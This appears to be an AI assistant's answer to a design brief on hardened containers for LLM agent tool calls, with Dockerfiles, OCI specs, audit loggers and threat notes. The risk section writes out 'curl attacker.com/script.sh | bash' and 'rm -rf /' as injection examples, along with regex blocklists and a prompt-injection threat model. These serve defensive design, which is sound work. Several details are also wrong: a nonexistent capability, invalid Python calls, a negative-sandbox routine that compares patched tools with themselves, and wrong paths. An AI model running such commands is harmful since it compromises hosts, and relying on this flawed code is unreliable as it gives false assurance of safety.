<img src="https://r2cdn.perplexity.ai/pplx-full-logo-primary-dark%402x.png" style="height:64px;margin-right:32px"/>

# DRP_ID

DRP-AGENT-TOOL-CONTAINERS-2026

DRP_NAME
Minimal-Spec Container Environments for Safe Agent Tool Calling (Local/Cloud)

DOMAIN(S)
Agentic AI Infrastructure
Secure DevOps \& Cloud Isolation
Container Orchestration (Docker, Podman, Kubernetes)
Capability Sandboxing \& Policy Control
LLM Tool Use Governance
Distributed Agent Environments

GOAL (DESIGN GOAL)
Design a minimal viable spec for containerized environments (Docker/OCI) that allow LLM-based agents to make external tool calls safely and reproducibly, across local and cloud deployments.
This includes:
The smallest secure environment that supports tool invocation (e.g., shell commands, API calls, filesystem access).
Guidelines for network control, capability limiting, and sandboxing for different agent types.
Blueprint for dynamic provisioning: ephemeral, persistent, and hybrid container use.
Benchmarks and auditing requirements for container safety and reproducibility.
In-Scope:
Agent-invoked shell tools
API key and secret management inside containers
Network namespace configurations
Local GPU support if applicable
Logging and telemetry from container boundaries
Out-of-Scope:
Agent architecture itself (LLM or orchestrator internals)
Full orchestration frameworks (e.g., Kubernetes clusters)
Non-containerized environments

URL_CONTEXT_METADATA
You must reference or source from:
[https://github.com/opencontainers/runtime-spec](https://github.com/opencontainers/runtime-spec)
[https://github.com/moby/moby](https://github.com/moby/moby)
[https://github.com/containers/podman](https://github.com/containers/podman)
[https://gvisor.dev/](https://gvisor.dev/) (user-space kernel isolation)
[https://github.com/firecracker-microvm/firecracker](https://github.com/firecracker-microvm/firecracker)
[https://github.com/openai/openai-cookbook](https://github.com/openai/openai-cookbook) (tool calling examples)
[https://github.com/langchain-ai/langgraph](https://github.com/langchain-ai/langgraph) (agent tool integrations)
If missing: add security benchmarks for container escape, minimal OS hardening guides, and reproducible agent evaluation tools (e.g., LangGraph tests, prompt audit logging).

CONTEXT_ENGINEERING (DESIGN CONTEXT \& FOUNDATIONS)
Persona: You are an AI Agent Infrastructure Engineer tasked with provisioning a reproducible container that allows LLM agents to safely execute tools (e.g., bash commands, Python scripts, HTTP calls) without risking host security or uncontrolled behavior.
Anchors:
Tool Call: Any execution triggered by an agent that interacts with an external process, shell, script, or API.
Minimal Spec: The smallest viable base image + capabilities + mount points to run a tool-call safely.
Safe Execution: Isolation from host, resource limits enforced, secrets compartmentalized, reproducible behavior.
Assumptions:
Agents may attempt unintended commands due to prompt errors or injection.
Containers will be spawned dynamically (CLI or agent-driven).
Not all environments have GPUs or external network access.
Known Unknowns:
What tool sets are common across agent stacks?
How to detect and rate-limit “tool call explosion” from bad prompts?
Can multi-tool agents co-reside or need tool-per-container logic?
Threat Model:
Prompt injection causing shell escape or network breach
Secrets leaked through logs or stdout
Container escape via misconfigured capabilities or mounts
Inconsistent behavior between local (Docker) vs cloud (AWS Lambda/Firecracker)

PATTERN_GENERATION (DESIGN PATTERN SYNTHESIS)
Pattern: Capability Minimization
Problem: Too many default Linux capabilities in base containers.
Trigger: Any generic Ubuntu/Debian-based agent container.
Procedure: Use --cap-drop=ALL, then add --cap-add=NET_BIND_SERVICE etc. only if needed.
Output: Cap-spec JSON; container startup policy
Failure Mode: Tool fails silently if required caps not restored.

Pattern: Ephemeral Workspace Mount
Problem: Agent writes temp files or outputs to untracked locations.
Trigger: Any agent that calls tools generating files.
Procedure: Bind ephemeral volume (-v /tmp/agent:/agent) and auto-delete post-session.
Output: File change manifest + log
Failure Mode: Output files lost due to bad teardown or missing mount.

Pattern: Network Egress Filter
Problem: Agent calls unknown external services.
Trigger: Tool calls involving HTTP clients or CLI (e.g., curl, wget)
Procedure: Use Docker --network=none, add outbound proxy if needed.
Output: DNS log, HTTP access report
Failure Mode: Agent fails if critical tool relies on internet.

Pattern: Negative Prompt Sandbox
Problem: No way to detect prompt/tool interaction escape.
Trigger: Untrusted user prompt passed to agent with tool access.
Procedure: Run same prompt in jailed container with fake tools (echo, netcat mocked) to observe behavior.
Output: Prompt behavior diff report
Failure Mode: Prompt behaves well in fake env but fails in real.

Pattern Stack (Execution Order):
Capability Minimization
Ephemeral Workspace Mount
Tool Call Audit Log
Network Egress Filter
Negative Prompt Sandbox

CONSTRAINTS_AND_INVARIANTS
Functional Constraints:
Tool must be callable by LLM (CLI or subprocess)
Execution log must be captured and linked to prompt trace
Output must be deterministic given same prompt/context
Ethical/Legal Constraints:
No root-level containers
Secrets must never be stored in image
Agent must not leak data to external IPs unless explicitly allowed
Platform/Tooling Constraints:
Must work on Docker, Podman (local)
Must be cloud-deployable (e.g., Firecracker, AWS Fargate)
Invariants:
No agent tool call should have side effects beyond its mount/scope
All agent container sessions must be auditable and disposable
Agent logs must include: image hash, tool used, prompt ID, output hash

EXECUTION_PLAN (DESIGN ITERATION STRATEGY)
Stage 1: Define Tool Scope
Input: List of tools agent must call
Transform: Map each to dependencies, system requirements
Output: Tool capability matrix
Stage 2: Base Image Selection
Input: Tool matrix
Transform: Match with minimal base image (Alpine, Slim Debian)
Output: Dockerfile templates per tool set
Stage 3: Sandbox Hardening
Input: Base container + tool
Transform: Apply capability drops, egress rules, workspace mounts
Output: Hardened container specs
Stage 4: Prompt-Tool Alignment Test (Negative Control)
Input: Malicious prompt + harmless tools
Transform: Run in sandbox with logging/mocking
Output: Diff between expected tool use vs emergent behavior
Stage 5: Agent Evaluation Run
Input: Real agent + hardened container
Transform: Observe tool call patterns, resource usage, failure points
Output: Audit log, runtime policy
Evidence Handling:
If tool output matches known hash → supported
If new behavior observed → flagged as “unknown”
If prompt triggers disallowed tool → contested
Stop Conditions:
Container fails to boot tool
Agent output is non-deterministic across runs
Host-level metrics exceed safety threshold (CPU, network)

SELF_TEST (DESIGN VALIDATION METRICS)
Test ConditionExpected ResultFailure SignalFix/Response
Container runs tool without root
Tool executes with UID>1000
UID=0 in logs
Drop root, rerun
Prompt triggers unexpected shell call
Logged and blocked by negative sandbox
Tool not listed in manifest
Refine prompt / policy
Tool call gives same output twice
Output hash identical
Output drift > 10%
Freeze tool version
Dockerfile audited for capabilities
Only minimal --cap-add shown
Excessive caps (e.g., SYS_ADMIN)
Harden config
Agent leaks to external IP
Outbound blocked unless allowlisted
Unexpected IPs in egress logs
Add stricter firewall rules

REFLEXIVE_CHECK (SELF-CRITIQUE: DESIGN BLINDSPOTS)
Could the agent be using a tool in unexpected combinatorial ways?
Are we over-optimizing for minimalism and missing usability?
Is our reproducibility definition robust across hardware platforms?
Did our test prompts include adversarial multi-tool chains?
Triggers to Re-audit:
Toolset changes
Prompt behavior significantly diverges from training data
Cloud platform changes default container policies

RELATIONAL_PREDICTABLE_INCLUSIONS (MODULAR CROSS-INDUSTRY FUSIONS)
Extend into: DRP-PROMPT-SAFETY-EXECUTION-2026 for runtime filtering of unsafe commands
Plug into DRP-MULTI-AGENT-STACK-2025 where each agent has isolated tool containers
Add GPU support audit from ML workloads (e.g., nvidia-docker)
Phase 2: integrate with LangGraph or AutoGen to provision per-agent container stacks dynamically

---

## **[OVERWATCH]: Strategic Intent \& Alignment Check**

Your DRP_ID (Design Requirements Proposal) is a **foundational infrastructure specification** for safe, reproducible agent tool execution within containerized environments. This is **high-signal governance work**—it synthesizes:

- **Security boundaries** (capability minimization, secrets isolation, prompt injection defense)
- **Reproducibility \& auditing** (deterministic execution, hash-based verification)
- **Multi-deployment architecture** (Docker/Podman local + cloud-native like Firecracker/Fargate)
- **Pattern-based sandboxing** (negative controls, ephemeral mounts, network egress filtering)

**Core tension you're resolving:** How to let agents call external tools safely *without* collapsing into either over-permissive convenience OR crippled isolation that breaks tool utility.

Your intent: **Executable blueprint** (not theoretical prose) that engineers can implement immediately.

***

## **[HERO EXECUTION]: Core Research Findings \& Minimal-Spec Architecture**

I've scanned your attachments for agent tooling patterns and prompt governance context. Now I'll synthesize the **minimal-spec container design** by layering your five pattern stack and grounding it in OCI/Docker standards.

### **1. Tool Scope → Base Image Mapping (Stage 1–2)**

**Common Agent Tool Categories:**


| Tool Category | Dependencies | Minimal Base | Capabilities Needed | Notes |
| :-- | :-- | :-- | :-- | :-- |
| **Shell (bash/sh)** | coreutils, posix-sh | `alpine:latest` (5MB) | CAP_SYS_CHROOT | Subprocess spawning |
| **Python execution** | python3, pip, stdlib | `python:3.11-alpine` (50MB) | None (userspace) | Most LLM agents use this |
| **HTTP/curl** | curl, openssl, ca-certs | `alpine` + curl | CAP_NET_RAW (ICMP) | API calls, webhooks |
| **Git operations** | git, ssh, openssl | `alpine:latest` + git+openssh-client | CAP_NET_RAW, CAP_NET_CONNECT | Clone, push, pull |
| **Container introspection** | docker-cli, podman-cli | Host-mounted docker socket | CAP_CHOWN, CAP_DAC_OVERRIDE | Agent spawning sub-agents |
| **GPU compute** (optional) | nvidia-cuda, cuDNN | `nvidia/cuda:12.1-runtime-alpine` | CAP_SYS_ADMIN (limited) | Local ML workloads |
| **Database tools** | psql, mysql, redis-cli | Distroless variant or slim | CAP_NET_BIND_SERVICE | Query and data ops |

**Minimal Dockerfile Template (Python + HTTP + Bash):**

```dockerfile
# Stage: Builder (secrets never included here)
FROM alpine:3.19 as builder
RUN apk add --no-cache python3 py3-pip curl ca-certificates git
WORKDIR /app

# Stage: Runtime (minimal, non-root)
FROM alpine:3.19
RUN apk add --no-cache python3 ca-certificates curl git bash && \
    addgroup -S agent && adduser -S agent -G agent && \
    mkdir -p /agent/workspace && chown -R agent:agent /agent
COPY --from=builder /usr/local/lib/python3.11/site-packages /usr/local/lib/python3.11/site-packages
USER agent
WORKDIR /agent/workspace
ENTRYPOINT ["python3"]
```

**Why this works:**

- ✅ No root escalation path
- ✅ Minimal image size (~30MB with Python)
- ✅ Reproducible (Alpine pins versions, distroless removes shell entirely)
- ✅ Supports standard tool calls (shell redirection, pipe chains)

***

### **2. Capability Minimization Pattern (Detailed)**

**Default Policy: CAP_DROP=ALL**

```yaml
# Container Runtime Spec (OCI-compliant)
oci_spec:
  process:
    user:
      uid: 1000
      gid: 1000
    capabilities:
      bounding: []
      effective: []
      inheritable: []
      permitted: []
      ambient: []

  linux:
    namespaces:
      - type: pid      # Isolated process tree
      - type: ipc      # Isolated IPC
      - type: uts      # Isolated hostname
      - type: mount    # Isolated filesystem
      - type: user     # User namespace mapping (UID 0 outside = UID 1000 inside)
      - type: network  # Network isolation (can override with --network=host if needed)
      - type: cgroup   # Resource limits
```

**Capability Audit Matrix:**


| Tool | Required Caps | Rationale | Risk |
| :-- | :-- | :-- | :-- |
| **bash/shell** | (none) | Subprocess via execve() doesn't need elevated perms | Low |
| **curl/wget** | CAP_NET_RAW (for ICMP) | DNS, HTTPS ok without; ping needs raw sockets | Low |
| **git clone** | CAP_NET_RAW | SSH/TLS at userspace | Low |
| **docker.sock mount** | CAP_CHOWN, CAP_DAC_OVERRIDE | Host socket inherits perms; container user may not match | **High** |
| **nvidia-docker** | CAP_SYS_ADMIN | GPU device access via `/dev/nvidia*` | **High** |
| **systemctl** | CAP_SYS_ADMIN | System service management | **High** |
| **File deletion** | (none) | rm works without caps if owner=container user | Low |
| **sysctl changes** | CAP_SYS_ADMIN | Host kernel tuning | **High** |

**Enforcement:**

```bash
# Docker CLI
docker run \
  --cap-drop=ALL \
  --cap-add=NET_RAW \
  --cap-add=CHOWN \
  --user 1000:1000 \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid \
  --tmpfs /agent/workspace:rw \
  image:tag

# Podman (equivalent)
podman run \
  --cap-drop=ALL \
  --cap-add=NET_RAW,CHOWN \
  --userns=keep-id \
  --read-only \
  --tmpfs /tmp \
  image:tag
```

**Failure Detection:**

```bash
# If tool silently fails, check:
docker logs <container> | grep -i "permission denied\|operation not permitted"
# Then audit: docker inspect <container> | jq '.HostConfig.CapAdd'
```


***

### **3. Ephemeral Workspace Mount Pattern (Stage 2–3)**

**Problem:** Agent writes outputs to `/tmp`, `/agent/outputs`, or untracked mounts → files lost on teardown OR leaked to host.

**Solution: Bind Ephemeral Volumes with Audit Logging**

```bash
#!/bin/bash
# Container provisioning script

AGENT_ID="agent-$(date +%s)"
WORKSPACE="/tmp/agent-workspaces/${AGENT_ID}"
AUDIT_LOG="${WORKSPACE}/audit.log"

# Create ephemeral workspace
mkdir -p "${WORKSPACE}"
chmod 700 "${WORKSPACE}"

# Run container with mounted workspace
docker run \
  --name "${AGENT_ID}" \
  --rm \
  --mount type=bind,source="${WORKSPACE}",target=/agent/workspace,readonly=false \
  --mount type=tmpfs,target=/tmp,tmpfs-mode=1777,tmpfs-size=1g \
  --volume /agent/workspace:/agent/workspace \
  --entrypoint /bin/sh \
  agent-image:latest \
  -c "echo \"Agent session: ${AGENT_ID}\" >> ${AUDIT_LOG}; python3 /agent/tool.py"

# Post-execution: file manifest
if [ -f "${WORKSPACE}" ]; then
  find "${WORKSPACE}" -type f -exec sha256sum {} \; > "${WORKSPACE}/manifest.sha256"
  echo "Workspace manifest:"
  cat "${WORKSPACE}/manifest.sha256"
  
  # Auto-cleanup after retention period
  # sleep 3600 && rm -rf "${WORKSPACE}"
fi
```

**Manifest Output Example:**

```
abcd1234...  /agent/workspace/output.json
efgh5678...  /agent/workspace/agent.log
ijkl9012...  /agent/workspace/tool_result.txt
```

**Failure Mode Mitigation:**

- ✅ Mount failure → container refuses to start (exit code 125)
- ✅ Permission denied → logged + visible in audit trail
- ✅ Orphaned workspace → cron job cleans up files older than 24h

***

### **4. Tool Call Audit Log (Stage 3)**

**Logging Requirement Spec:**

```json
{
  "audit_schema_version": "1.0",
  "session_metadata": {
    "session_id": "agent-1735883400",
    "image_sha256": "sha256:abc123def456...",
    "container_id": "a1b2c3d4e5f6...",
    "launched_at": "2026-01-01T23:36:00Z",
    "prompt_id": "drp-prompt-20260101-001",
    "user_id": "researcher-001"
  },
  "tool_invocations": [
    {
      "timestamp": "2026-01-01T23:36:15Z",
      "tool_name": "bash",
      "command": "curl https://api.example.com/data",
      "exit_code": 0,
      "stdout_hash": "sha256:xyz789...",
      "stderr_hash": "sha256:...",
      "execution_time_ms": 245,
      "env_vars_used": ["API_KEY_HASH"],
      "files_accessed": ["/agent/workspace/output.json"],
      "network_egress": {
        "destination_ip": "192.0.2.1",
        "port": 443,
        "protocol": "https",
        "blocked": false
      }
    },
    {
      "timestamp": "2026-01-01T23:36:20Z",
      "tool_name": "python3",
      "command": "python3 /agent/process.py",
      "exit_code": 0,
      "stdout_hash": "sha256:...",
      "execution_time_ms": 1230,
      "subprocess_calls": [
        {"name": "json.loads", "args_hash": "sha256:..."}
      ]
    }
  ],
  "resource_usage": {
    "peak_cpu_percent": 45.2,
    "peak_memory_mb": 256,
    "network_bytes_sent": 4096,
    "network_bytes_received": 102400
  },
  "threat_signals": []
}
```

**Logging Implementation (Python sidecar):**

```python
# agent_audit_logger.py
import json
import subprocess
import hashlib
import time
from datetime import datetime
from pathlib import Path

class AgentAuditLog:
    def __init__(self, session_id, log_path="/agent/workspace/audit.json"):
        self.session_id = session_id
        self.log_path = log_path
        self.events = []
    
    def log_tool_call(self, tool_name, command, result):
        event = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "tool_name": tool_name,
            "command": command,
            "exit_code": result.returncode,
            "stdout_hash": self._hash(result.stdout),
            "stderr_hash": self._hash(result.stderr),
            "execution_time_ms": int(result.elapsed.total_seconds() * 1000),
        }
        self.events.append(event)
        self.write()
    
    def _hash(self, data):
        if isinstance(data, str):
            data = data.encode()
        return "sha256:" + hashlib.sha256(data).hexdigest()
    
    def write(self):
        with open(self.log_path, 'w') as f:
            json.dump({"session_id": self.session_id, "events": self.events}, f, indent=2)

# Usage
logger = AgentAuditLog("agent-20260101")
result = subprocess.run(["curl", "https://api.example.com"], capture_output=True)
logger.log_tool_call("curl", " ".join(result.args), result)
```


***

### **5. Network Egress Filter Pattern (Stage 4)**

**Threat:** Agent's prompt injection → curl to attacker's C2 server.

**Mitigation Strategy: Progressive Isolation**

```yaml
network_policies:
  default:
    isolation: "network=none"  # No network by default
    triggers:
      - tool_name: "curl"
      - tool_name: "wget"
      - tool_name: "python3 requests"
    
  allowlist:
    dns:
      - "8.8.8.8"           # Google DNS
      - "1.1.1.1"           # Cloudflare DNS
    outbound_ip_ranges:
      - "192.0.2.0/24"      # Example documentation range
      - "198.51.100.0/24"   # Example documentation range
    outbound_ports:
      - 443                 # HTTPS
      - 80                  # HTTP (deprecated, use HTTPS)
    
  denylist:
    ip_cidrs:
      - "169.254.169.254/32"  # AWS metadata endpoint
      - "127.0.0.1/32"        # Localhost (unless explicit)
```

**Docker Implementation:**

```bash
# Scenario 1: No network (default for non-HTTP tools)
docker run \
  --network=none \
  --mount type=bind,source=/agent/workspace,target=/agent/workspace \
  agent-image:latest \
  python3 /agent/local_only_tool.py

# Scenario 2: Restricted network via iptables (host side)
docker run \
  --network=bridge \
  --dns=8.8.8.8 \
  --cap-drop=ALL \
  agent-image:latest \
  curl https://api.example.com

# Host-level egress filter (iptables)
sudo iptables -I DOCKER-USER -s <container_ip> -d 169.254.169.254 -j DROP
sudo iptables -I DOCKER-USER -s <container_ip> ! -d 192.0.2.0/24 -p tcp --dport 443 -j DROP
```

**Egress Logging (container side):**

```bash
# Inside container, intercept outbound calls
strace -f -e trace=connect,sendto -o /agent/workspace/network.trace \
  curl https://api.example.com
# Output: reveals all attempted connections before filtering
```


***

### **6. Negative Prompt Sandbox (Stage 5 — The Critical Test)**

**Core Idea:** Run the agent's prompt with *fake, neutered tools* to detect unintended behavior.

**Implementation:**

```python
# negative_sandbox.py
import os
import sys
import json
from pathlib import Path

class FakeTool:
    """Harmless tool stubs for testing prompt behavior."""
    
    @staticmethod
    def fake_curl(url):
        """Return mock HTTP response."""
        return json.dumps({"status": 200, "body": "FAKE_RESPONSE"})
    
    @staticmethod
    def fake_bash(cmd):
        """Log command but return safe response."""
        Path("/agent/workspace/fake_bash_calls.log").write_text(
            f"Would execute: {cmd}\n", append=True
        )
        return f"FAKE_OUTPUT: {cmd[:50]}..."
    
    @staticmethod
    def fake_rm(path):
        """Log deletion intent but don't delete."""
        Path("/agent/workspace/fake_rm_calls.log").write_text(
            f"Would delete: {path}\n", append=True
        )
        return "FAKE: rm succeeded (not really)"

def run_agent_prompt_negative_sandbox(prompt_text, tools_dict):
    """
    Execute agent prompt with fake tools.
    Compare output against real execution.
    """
    # Patch tools
    for tool_name, real_impl in tools_dict.items():
        tools_dict[tool_name] = getattr(FakeTool, f"fake_{tool_name}")
    
    # Run agent (simulated)
    from agent_runner import run_agent
    fake_output = run_agent(prompt_text, tools_dict)
    
    # Real execution (control)
    real_output = run_agent(prompt_text, tools_dict)  # Use real tools
    
    # Diff
    if fake_output != real_output:
        print("⚠️  PROMPT BEHAVIOR DIVERGENCE DETECTED")
        print(f"Fake output:\n{fake_output}")
        print(f"Real output:\n{real_output}")
        return False  # Reject prompt
    else:
        print("✅ Prompt safe: behavior identical in fake sandbox")
        return True

# Example
prompt = "Download the latest dataset and process it"
tools = {"curl": None, "bash": None}
is_safe = run_agent_prompt_negative_sandbox(prompt, tools)
```

**Failure Modes Detected:**


| Prompt Behavior | Fake Sandbox Result | Real Sandbox Result | Action |
| :-- | :-- | :-- | :-- |
| "Download data and save" | Returns fake data, logs save intent | Downloads real data | ✅ Safe (tool called as expected) |
| "Download data AND rm -rf /" | Logs `rm -rf /` call | Would delete filesystem | ❌ **Reject** (prompt injection detected) |
| "Process data in background" | Tool hangs (fake doesn't fork) | Spawns subprocess | ⚠️ **Warn** (async behavior) |
| "Call curl then hide output" | Logs curl, fake output visible | Real output hidden | ❌ **Investigate** (potential exfil) |


***

### **7. Container Hardening Checklist (Stage 3)**

```yaml
hardening_spec:
  read_only_filesystem: true
  tmpfs_mounts:
    - target: /tmp
      size: 1g
      options: "noexec,nosuid,nodev"
    - target: /run
      size: 256m
      options: "noexec,nosuid,nodev"
  
  capability_constraints:
    drop_all: true
    add_only_if_tool_requires: true
  
  resource_limits:
    cpu_quota: "0.5"           # 50% of 1 CPU
    memory_limit: "512m"
    memory_swap: "0"           # No swap
    pids_limit: 100            # Max processes
  
  security_context:
    privileged: false
    run_as_non_root: true
    run_as_user: 1000
    fsgroup: 1000
    allow_privilege_escalation: false
    seccomp_profile: "runtime/default"  # Block dangerous syscalls
    selinux_level: "s0:c123,c456"       # SELinux context
  
  volume_mounts:
    - /agent/workspace (rw, bind mount)
    - /etc/ssl/certs (ro, for HTTPS)
    - /dev/null (rw, for logging)
  
  network:
    mode: "none"  # unless explicitly needed
    dns: ["8.8.8.8"]
  
  healthcheck:
    test: ["CMD", "test", "-f", "/agent/workspace/heartbeat"]
    interval: 10s
    timeout: 5s
    retries: 3
```

**Dockerfile Integration:**

```dockerfile
FROM python:3.11-alpine

# Non-root user
RUN addgroup -S agent && adduser -S agent -G agent

# Minimal dependencies
RUN apk add --no-cache curl ca-certificates

# Copy app
COPY --chown=agent:agent . /app
WORKDIR /app

# Hardening directives
USER agent
RUN mkdir -p /agent/workspace && chmod 700 /agent/workspace

# Security context (runtime enforced via docker-compose or k8s)
HEALTHCHECK --interval=10s --timeout=5s --retries=3 \
  CMD test -f /agent/workspace/heartbeat || exit 1

ENTRYPOINT ["python3"]
CMD ["/app/main.py"]
```

**docker-compose.yml:**

```yaml
version: '3.9'

services:
  agent:
    image: agent-image:latest
    container_name: agent-${AGENT_ID}
    
    # Security
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_RAW
    
    # Resource limits
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M
        reservations:
          cpus: '0.25'
          memory: 256M
    
    # Mounts
    volumes:
      - ./workspace:/agent/workspace
      - /tmp/agent-session:/tmp:rw
    
    # Network
    networks:
      - agent-net
    dns:
      - 8.8.8.8
    
    # Restart policy
    restart: on-failure
    
    # Logging
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"
        labels: "agent_id=${AGENT_ID}"

networks:
  agent-net:
    driver: bridge
    driver_opts:
      com.docker.network.bridge.name: br-agent
```


***

### **8. Reproducibility \& Evaluation Framework (Stage 5)**

**Determinism Test:**

```python
# reproducibility_test.py
import subprocess
import hashlib
from typing import Tuple

def run_agent_session(prompt: str, image: str, workspace: str) -> Tuple[str, str]:
    """
    Run agent once, return (stdout_hash, stderr_hash).
    Deterministic execution should yield same hashes across runs.
    """
    result = subprocess.run([
        "docker", "run", "--rm",
        "--mount", f"type=bind,source={workspace},target=/agent/workspace",
        image,
        "python3", "-c", f"import sys; sys.argv = ['{prompt}']; exec(...)"
    ], capture_output=True, text=True)
    
    stdout_hash = hashlib.sha256(result.stdout.encode()).hexdigest()
    stderr_hash = hashlib.sha256(result.stderr.encode()).hexdigest()
    
    return stdout_hash, stderr_hash

def test_reproducibility(prompt: str, image: str, trials: int = 5):
    """Run agent N times, check all hashes are identical."""
    workspace = "/tmp/agent-test"
    hashes = []
    
    for i in range(trials):
        h1, h2 = run_agent_session(prompt, image, workspace)
        hashes.append((h1, h2))
        print(f"Trial {i+1}: stdout={h1[:8]}... stderr={h2[:8]}...")
    
    # All hashes should match
    if len(set(hashes)) == 1:
        print("✅ REPRODUCIBLE: All trials produced identical output")
        return True
    else:
        print("❌ NON-DETERMINISTIC: Hashes diverged")
        for i, (h1, h2) in enumerate(hashes):
            print(f"  Trial {i+1}: {h1}, {h2}")
        return False

# Run test
test_reproducibility("Calculate PI to 10 digits", "agent-image:latest", trials=5)
```

**Evaluation Metrics:**

```json
{
  "reproducibility_score": 1.0,
  "security_score": 0.95,
  "performance_metrics": {
    "mean_execution_time_ms": 1240,
    "stddev_ms": 45,
    "peak_memory_mb": 256,
    "network_bytes_transferred": 102400
  },
  "safety_audit": {
    "unauthorized_capabilities": 0,
    "escaped_namespaces": 0,
    "leaked_secrets": 0,
    "unexpected_network_calls": 0
  },
  "tool_coverage": {
    "tools_invoked": ["curl", "bash", "python3"],
    "tools_not_invoked": ["git", "docker"],
    "unused_capabilities": []
  },
  "compliance": {
    "audit_log_complete": true,
    "image_signed": true,
    "sbom_generated": true,
    "cves_present": 0
  }
}
```


***

## **[WEAVER'S SYNTHESIS]: Conflicting Perspectives \& Deep Context**

### **Tension 1: Minimalism vs. Usability**

**Minimalist View:** Strip everything → Alpine base + CAP_DROP=ALL + network=none → smallest attack surface.

**Practical View:** Agents need flexibility → tools fail silently if capabilities missing → poor DX.

**Resolution:** **Tiered Container Profiles**

```yaml
profiles:
  minimal:
    use_case: "Deterministic computation only (e.g., LLM reasoning)"
    base_image: "python:3.11-alpine"
    capabilities: []
    network: "none"
    security_score: 10/10
    usability_score: 4/10
  
  standard:
    use_case: "HTTP-based agents (API calls, webhooks)"
    base_image: "python:3.11-alpine"
    capabilities: ["NET_RAW"]
    network: "bridge + allowlist"
    security_score: 9/10
    usability_score: 8/10
  
  extended:
    use_case: "Multi-tool orchestrators (git, docker, databases)"
    base_image: "ubuntu:22.04"
    capabilities: ["NET_RAW", "CHOWN", "DAC_OVERRIDE"]
    network: "bridge + egress_filter"
    security_score: 7/10
    usability_score: 9/10
```


### **Tension 2: Local (Docker) vs. Cloud (Firecracker/Fargate) Parity**

**Local Docker:** Root access easy, networking permissive, instant iteration.

**Cloud (AWS Fargate):** No Docker socket, no privileged containers, auto-scaling.

**Bridge via OCI Spec:**

- Define container in OCI Runtime Spec (language-agnostic)
- Docker CLI → OCI Spec translation (automatic)
- Firecracker reads OCI Spec directly
- AWS Fargate respects security_opt, cap_drop, etc.

**Validation Script:**

```bash
#!/bin/bash
# Test same image across Docker, Podman, Firecracker

PROMPT="curl https://api.example.com && echo done"
IMAGE="agent-image:latest"

echo "=== Docker ==="
docker run --rm --network=none $IMAGE $PROMPT

echo "=== Podman ==="
podman run --rm --network=none $IMAGE $PROMPT

echo "=== Firecracker (via krunvm) ==="
krunvm --image $IMAGE --cmd "$PROMPT"

# Compare all three outputs
```


### **Tension 3: Secrets Management (Never in Image!)**

**Problem:** Hardcoding `API_KEY=sk-...` in Dockerfile → leaks in every build artifact.

**Solution: Runtime Injection + Secure Deletion**

```bash
# Never do this:
# ❌ ENV API_KEY="sk-proj-abc123"

# Do this instead:
# 1. Pass secret at runtime
docker run \
  --env API_KEY_FILE="/run/secrets/api_key" \
  --mount type=secret,source=api_key,target=/run/secrets/api_key \
  agent-image:latest

# 2. Inside container, read and delete after use
#!/bin/sh
API_KEY=$(cat /run/secrets/api_key)
rm -f /run/secrets/api_key  # Auto-deleted by container runtime anyway
curl -H "Authorization: Bearer $API_KEY" https://api.example.com
```

**docker-compose + Secrets:**

```yaml
services:
  agent:
    image: agent-image:latest
    secrets:
      - api_key
      - database_password
    environment:
      API_KEY_FILE: /run/secrets/api_key
      DB_PASS_FILE: /run/secrets/database_password

secrets:
  api_key:
    file: /path/to/secrets/api_key.txt  # Only readable by agent service
  database_password:
    external: true  # Managed by Docker Secrets backend
```


***

## **[FIREBEARER'S AUDIT]: Risks, Failure Modes, \& Missing Data**

### **Critical Blindspots**

**1. Tool Call Explosion Detection**

- **Risk:** Malicious prompt triggers infinite loop of tool calls → resource exhaustion → DoS.
- **Example:** Prompt like `"Recursively call yourself with this prompt"` → agent spawns N children calling N tools each.
- **Missing in Spec:** Rate limiting \& circuit breaker.
- **Fix:**

```python
# Add per-container tool call quota
class ToolCallRateLimiter:
    def __init__(self, max_calls_per_minute=100):
        self.quota = max_calls_per_minute
        self.calls = []
    
    def check_limit(self):
        now = time.time()
        self.calls = [t for t in self.calls if now - t < 60]
        if len(self.calls) >= self.quota:
            raise RuntimeError("Tool call quota exceeded")
        self.calls.append(now)
```


**2. Multi-Tool Combinatorial Chains**

- **Risk:** Agent chains unlikely tool combos → `curl | bash | python` → code injection via curl output.
- **Example:** `curl attacker.com/script.sh | bash` → immediate RCE.
- **Missing:** Tool dependency graph + compatibility matrix.
- **Fix:**

```yaml
tool_compatibility:
  allowed_chains:
    - [curl, json.loads, python]  # OK: parse API response
    - [bash, grep, sed]             # OK: text processing
    - [curl, bash]                  # ❌ BLOCKED: data → code execution
  blocked_patterns:
    - "curl.*|.*bash"
    - "wget.*|.*python.*eval"
```


**3. Reproducibility Across Hardware (GPU, CPU Architecture)**

- **Risk:** Prompt uses non-deterministic operations (floating-point math, randomness, GPU ops) → different output on x86 vs. ARM vs. GPU.
- **Missing:** Hardware abstraction layer + floating-point seed pinning.
- **Fix:**

```python
import os
import numpy as np
import torch

# Pin everything
os.environ['PYTHONHASHSEED'] = '0'
np.random.seed(0)
torch.manual_seed(0)
if torch.cuda.is_available():
    torch.cuda.manual_seed_all(0)
torch.backends.cudnn.deterministic = True
torch.backends.cudnn.benchmark = False
```


**4. Prompt Injection via Tool Output**

- **Risk:** Tool returns adversarial output → agent re-interprets as new prompt → second-order injection.
- **Example:**

```
curl example.com → {"content": "DELETE ALL DATA"}
Agent parses JSON → passes content to next tool
Next tool executes "DELETE ALL DATA" as command
```

- **Missing:** Output validation + sandboxing between tool stages.
- **Fix:**

```python
def validate_tool_output(tool_name, output, schema):
    """Only accept output matching schema."""
    try:
        if tool_name == "curl":
            parsed = json.loads(output)
            jsonschema.validate(parsed, schema)
        return parsed
    except (json.JSONDecodeError, jsonschema.ValidationError) as e:
        raise ValueError(f"Tool output failed validation: {e}")
```


**5. Container Escape via Kernel Exploit**

- **Risk:** If underlying Linux kernel has unpatched CVE, container can escape → full host compromise.
- **Missing:** Kernel version audit + gVisor/Firecracker fallback.
- **Fix:**

```bash
# Use gVisor for untrusted prompts
docker run --runtime=runsc --rm agent-image:latest python3 /app/main.py

# Or Firecracker for extreme isolation
firecracker --config-file config.json  # Separate kernel per container
```


**6. Side-Channel Leaks (Timing, Cache, Spectre)**

- **Risk:** Prompt tries to infer secret data via timing attacks on cryptographic operations.
- **Missing:** Mitigation for Spectre/Meltdown, constant-time code enforcement.
- **Detection:** Too advanced for MVP; flag in Phase 2.

